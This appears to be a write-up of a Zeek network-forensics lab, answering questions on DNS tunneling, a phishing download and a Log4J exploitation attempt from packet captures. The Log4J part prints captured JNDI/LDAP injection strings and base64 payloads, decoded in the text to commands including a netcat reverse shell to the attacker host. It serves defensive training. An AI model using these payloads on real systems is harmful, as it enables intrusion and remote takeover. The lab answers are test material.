# Anomalous DNS

An alert triggered: "Anomalous DNS Activity".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 

Q1 Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?

A1 320

```
ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ zeek -Cr dns-tunneling.pcap

ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | head -n 20
(...)

ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut qtype_name | grep AAAA | wc -l
320
```

Q2 Investigate the conn.log file. What is the longest connection duration?

A2 9.420791

```
ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | head -n 20
(...)

ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut duration | sort -r | head
9.420791
7.835490
4.238265
3.445874
3.298156
3.029706
3.027164
2.837323
2.147446
0.880943
```

Q3 Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

A3 6

```
ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut qtype_name | sort -u | wc -l
6
```

Q4 There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

A4 10.20.57.3

```
ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut id.orig_h | sort -u  
10.20.57.3
fe80::202a:f0b1:7d9c:bd9e

ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut id.orig_h | grep "10.20.57.3" | wc -l
7108

ubuntu@ip-10-10-220-37:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut id.orig_h | grep "fe80::202a:f0b1:7d9c:bd9e" | wc -l
1

```

# Phishing

An alert triggered: "Phishing Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 

Q1 Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.
Note use cyberchef.io to defang the address

A1 10[.]6[.]27[.]102

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/phishing$ zeek -Cr phishing.pcap 

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/phishing$ cat conn.log | more
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2025-02-28-01-36-32
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_
p	proto	service	duration	orig_bytes	resp_bytes	conn_sta
te	local_orig	local_resp	missed_bytes	history	orig_pkts	
orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval
	count	count	string	bool	bool	count	string	count	count	
count	count	set[string]
1561667867.459349	CCXlmmp56cgwMwVqc	10.6.27.102	50800	224.0.0.
252	5355	udp	dns	0.109137	44	0	S0	-	
-	0	D	2	100	0	0	-
1561667868.993491	CiE8Be5TVatHbpQi3	10.6.27.102	56900	10.6.27.
1	53	udp	dns	0.025235	34	50	SF	-	
-	0	Dd	1	62	1	78	-
1561667874.670219	Cyce9PDDvrfrcXX3l	10.6.27.102	49157	23.63.25
4.163	80	tcp	http	0.074182	97	179	SF	-	
-	0	ShADafF	5	309	4	343	-
1561667860.448588	CEme0Q3cbgQk5sVCE	10.6.27.102	60307	10.6.27.
1	53	udp	dns	2.999460	102	0	S0	-	
-	0	D	3	186	0	0	-
1561667871.873982	CMFC3q32DQ3TR7RLi5	10.6.27.102	60424	224.0.0.
252	5355	udp	dns	0.110543	44	0	S0	-	
-	0	D	2	100	0	0	-
1561667874.640660	C9TRkp4SJlFvfCZR75	10.6.27.102	55652	10.6.27.
1	53	udp	dns	0.024647	34	140	SF	-	
-	0	Dd	1	62	1	168	-

```

Q2 Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.

A2 smart-fax[.]com

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/phishing$ cat http.log | more
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	http
#open	2025-02-28-01-36-32
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_
p	trans_depth	method	host	uri	referrer	version	user_age
nt	origin	request_body_len	response_body_len	status_code	
status_msg	info_code	info_msg	tags	username	password
	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	
resp_filenames	resp_mime_types
#types	time	string	addr	port	addr	port	count	string	string	
string	string	string	string	string	count	count	count	string	count	
string	set[enum]	string	string	set[string]	vector[string]	vector[s
tring]	vector[string]	vector[string]	vector[string]	vector[string]
1561667874.713411	Cyce9PDDvrfrcXX3l	10.6.27.102	49157	23.63.25
4.163	80	1	GET	www.msftncsi.com	/ncsi.txt	-	
1.1	Microsoft NCSI	-	0	14	200	OK	-	-	
(empty)	-	-	-	-	-	-	Fpgan59p6uvNzLFja	
-	text/plain
1561667889.643717	C5rwNQvz1Ha9XndKl	10.6.27.102	49159	107.180.
50.162	80	1	GET	smart-fax.com	/Documents/Invoice&MSO-Request.d
oc	-	1.1	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0
) like Gecko	-	0	323072	200	OK	-	-	(empty)
-	-	-	-	-	-	FB5o2Hcauv7vpQ8y3	-	
application/msword
1561667898.911759	CJxPAK1UT0RjpBbsG2	10.6.27.102	49162	107.180.
50.162	80	1	GET	smart-fax.com	/knr.exe	-	1.1	
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .N
ET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .
NET4.0C; .NET4.0E)	-	0	2437120	200	OK	-	-	
(empty)	-	-	-	-	-	-	FOghls3WpIjKpvXaEl	
-	application/x-dosexec
#close	2025-02-28-01-36-33

```

Q3 Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

A3 VBA

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/phishing$ zeek -Cr phishing.pcap hash-demo.zeek

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut mime_type md5
text/plain	cd5a4d3fdd5bffc16bf959ef75cf37bc
application/msword	b5243ec1df7d1d5304189e7db2744128
application/x-dosexec	cc28e40b46237ab6d5282199ef78c464
```
check b5243ec1df7d1d5304189e7db2744128 on VirusTotal

Q4 Investigate the extracted malicious .exe file. What is the given file name in Virustotal?

A4 PleaseWaitWindow.exe

check cc28e40b46237ab6d5282199ef78c464 on VirusTotal

Q5 Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.

A5 hopto[.]org

Q6 Investigate the http.log file. What is the request name of the downloaded malicious .exe file?

A6 knr.exe


# Log4J

An alert triggered: "Log4J Exploitation Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 

Q1 Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?

A1 3

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ zeek -Cr log4shell.pcapng detection-log4j.zeek 

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ cat signatures.log | more
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	signatures
#open	2025-02-28-02-13-48
#fields	ts	uid	src_addr	src_port	dst_addr	dst_port
	note	sig_id	event_msg	sub_msg	sig_count	host_count
#types	time	string	addr	port	addr	port	enum	string	string	
string	count	count
1640023652.109820	CGWLD91CJTlZ050dLj	192.168.56.102	389	172.17.0
.2	36820	Signatures::Sensitive_Signature	log4j_javaclassname_tcp	192.168.
56.102: log4j_javaclassname_tcp	0\x81\xc8\x02\x01\x02d\x81\xc2\x04-Basic/Command
/Base64/dG91Y2ggL3RtcC9wd25lZAo=0\x81\x900\x16\x04\x0djavaClassName1\x05\x04\x03
foo0,\x04\x0cjavaCodeBase1\x1c\x04\x1ahttp://192.168.56.102:443/0$\x04\x0bobject
C...	-	-
1640025554.665741	CseEHs3DemE64p42A5	192.168.56.102	389	172.17.0
.2	36822	Signatures::Sensitive_Signature	log4j_javaclassname_tcp	192.168.
56.102: log4j_javaclassname_tcp	0\x81\xd0\x02\x01\x02d\x81\xca\x045Basic/Command
/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==0\x81\x900\x16\x04\x0djavaClassName1\x05
\x04\x03foo0,\x04\x0cjavaCodeBase1\x1c\x04\x1ahttp://192.168.56.102:443/0$\x04..
.	-	-
1640026858.967970	CYS6r04g7DfUYwlq1i	192.168.56.102	389	172.17.0

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ cat signatures.log | zeek-cut sig_id | wc -l 
3
```

Q2 Investigate the http.log file. Which tool is used for scanning?
Hint: user agent

A2 nmap

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut user_agent | sort -u
${jndi:ldap://127.0.0.1:1389}
${jndi:ldap://192.168.56.102:389/test}
${jndi:ldap://192.168.56.102:389}
${jndi:ldap://192.168.56.102}
Java/1.8.0_181
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
SecurityNik Testing

```

Q3 Investigate the http.log file. What is the extension of the exploit file?
Hint: uri

A3 .class 

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ cat http.log | zeek-cut uri | sort -u
/
/Exploit6HHc3BcVzI.class
/ExploitQ8v7ygBW4i.class
/ExploitSMMZvT8GXL.class
/testing1
/testing123
testing1
```

Q4 Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?
Hint: You can use online decoders or use Linux terminal features. "echo 'base64 data' | base64 --decode"

A4  pwned

```
ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ cat log4j.log | more
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	log4j
#open	2025-02-28-02-13-48
#fields	ts	uid	http_uri	uri	stem	target_host	target_p
ort	method	is_orig	name	value	matched_name	matched_value
#types	time	string	string	string	string	string	string	string	bool	
string	string	bool	bool
1640023652.008511	CPhUOJ3IdEr1dVrMgi	/	192.168.56.102:389/Basic
/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=	192.168.56.102:389	192.168.
56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389
/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}	F	T
1640025554.661073	C6OoIU23bZZyvgV82j	/	192.168.56.102:389/Basic
/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==	192.168.56.102:389	
192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56
.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}	F	T
1640026858.960398	Cvn14O2mNzzX8k5Yi8	/	192.168.56.102:389/Basic
/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==	192.168.
56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:l
dap://192.168.56.102:389/Basic/Command/Base64/bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2
Jpbi9zaCAtdnZ2Cg==}	F	T

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ echo 'dG91Y2ggL3RtcC9wd25lZAo=}' | base64 --decode
touch /tmp/pwned
base64: invalid input

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ echo 'd2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==' | base64 --decode
which nc > /tmp/pwned

ubuntu@ip-10-10-27-17:~/Desktop/Exercise-Files/log4j$ echo 'bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==' | base64 --decode
nc 192.168.56.102 80 -e /bin/sh -vvv

```



